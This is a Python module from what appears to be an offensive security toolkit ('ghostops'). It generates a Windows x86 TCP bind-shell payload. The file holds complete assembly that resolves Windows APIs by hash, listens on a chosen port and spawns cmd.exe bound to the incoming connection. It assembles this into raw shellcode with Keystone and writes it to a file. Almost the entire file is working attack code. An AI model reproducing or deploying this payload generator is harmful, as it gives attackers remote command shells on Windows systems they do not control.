from pathlib import Path
from keystone import KsError, Ks, KS_ARCH_X86, KS_MODE_32
from ghostops.common.utils import Logger, HexConvert
from ghostops.core.base_module import BaseModule


class WindowsX86ShellBindTcp(BaseModule):
    name = "WindowsX86ShellBindTcp"
    description = "Generates TCP bind shell payload for x86 Windows system."
    author = "Awagat Dhungana <4w4647@gmail.com>"
    category = "payload"
    os = ["windows"]
    arch = ["x86"]

    @staticmethod
    def register_arguments(parser):
        parser.add_argument("--port", required=True, type=int, help="port number")
        parser.add_argument(
            "--output",
            required=True,
            type=str,
            help="Output filename for raw shellcode (e.g., ghostops.bin)",
        )

    @staticmethod
    def run(args):
        Logger.log("info", f"PORT - {args.port}")
        print()

        try:
            port_hex = HexConvert.port_to_hex(args.port)
        except Exception:
            Logger.log("flaw", "Invalid host or port provided.")
            return

        shellcode_template = f"""
cld
call   0x88
pusha
mov    ebp,esp
xor    eax,eax
mov    edx,DWORD PTR fs:[eax+0x30]
mov    edx,DWORD PTR [edx+0xc]
mov    edx,DWORD PTR [edx+0x14]
mov    esi,DWORD PTR [edx+0x28]
movzx  ecx,WORD PTR [edx+0x26]
xor    edi,edi
lods   al,BYTE PTR ds:[esi]
cmp    al,0x61
jl     0x25
sub    al,0x20
ror    edi,0xd
add    edi,eax
loop   0x1e
push   edx
push   edi
mov    edx,DWORD PTR [edx+0x10]
mov    ecx,DWORD PTR [edx+0x3c]
mov    ecx,DWORD PTR [ecx+edx*1+0x78]
jecxz  0x82
add    ecx,edx
push   ecx
mov    ebx,DWORD PTR [ecx+0x20]
add    ebx,edx
mov    ecx,DWORD PTR [ecx+0x18]
jecxz  0x81
dec    ecx
mov    esi,DWORD PTR [ebx+ecx*4]
add    esi,edx
xor    edi,edi
lods   al,BYTE PTR ds:[esi]
ror    edi,0xd
add    edi,eax
cmp    al,ah
jne    0x4f
add    edi,DWORD PTR [ebp-0x8]
cmp    edi,DWORD PTR [ebp+0x24]
jne    0x45
pop    eax
mov    ebx,DWORD PTR [eax+0x24]
add    ebx,edx
mov    cx,WORD PTR [ebx+ecx*2]
mov    ebx,DWORD PTR [eax+0x1c]
add    ebx,edx
mov    eax,DWORD PTR [ebx+ecx*4]
add    eax,edx
mov    DWORD PTR [esp+0x24],eax
pop    ebx
pop    ebx
popa
pop    ecx
pop    edx
push   ecx
jmp    eax
pop    edi
pop    edi
pop    edx
mov    edx,DWORD PTR [edx]
jmp    0x15
pop    ebp
push   0x3233
push   0x5f327377
push   esp
push   0x726774c
call   ebp
mov    eax,0x190
sub    esp,eax
push   esp
push   eax
push   0x6b8029
call   ebp
push   0x8
pop    ecx
push   eax
loop   0xae
inc    eax
push   eax
inc    eax
push   eax
push   0xe0df0fea
call   ebp
xchg   edi,eax
push   0x{port_hex}0002
mov    esi,esp
push   0x10
push   esi
push   edi
push   0x6737dbc2
call   ebp
push   edi
push   0xff38e9b7
call   ebp
push   edi
push   0xe13bec74
call   ebp
push   edi
xchg   edi,eax
push   0x614d6e75
call   ebp
push   0x646d63
mov    ebx,esp
push   edi
push   edi
push   edi
xor    esi,esi
push   0x12
pop    ecx
push   esi
loop   0xf7
mov    WORD PTR [esp+0x3c],0x101
lea    eax,[esp+0x10]
mov    BYTE PTR [eax],0x44
push   esp
push   eax
push   esi
push   esi
push   esi
inc    esi
push   esi
dec    esi
push   esi
push   esi
push   ebx
push   esi
push   0x863fcc79
call   ebp
mov    eax,esp
dec    esi
push   esi
inc    esi
push   DWORD PTR [eax]
push   0x601d8708
call   ebp
mov    ebx,0x56a2b5f0
push   0x9dbd95a6
call   ebp
cmp    al,0x6
jl     0x143
cmp    bl,0xe0
jne    0x143
mov    ebx,0x6f721347
push   0x0
push   ebx
call   ebp
        """

        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_32)
            encoding, _ = ks.asm(shellcode_template)
        except KsError as e:
            Logger.log("flaw", f"Assembly failed: {e}")
            return

        shellcode_bytes = bytes(encoding)
        Logger.log("good", f"Shellcode size: {len(shellcode_bytes)} bytes")

        output_path = Path(args.output)
        try:
            with open(output_path, "wb") as f:
                f.write(shellcode_bytes)
            Logger.log("good", f"Raw shellcode written to {output_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to write shellcode to file: {e}")
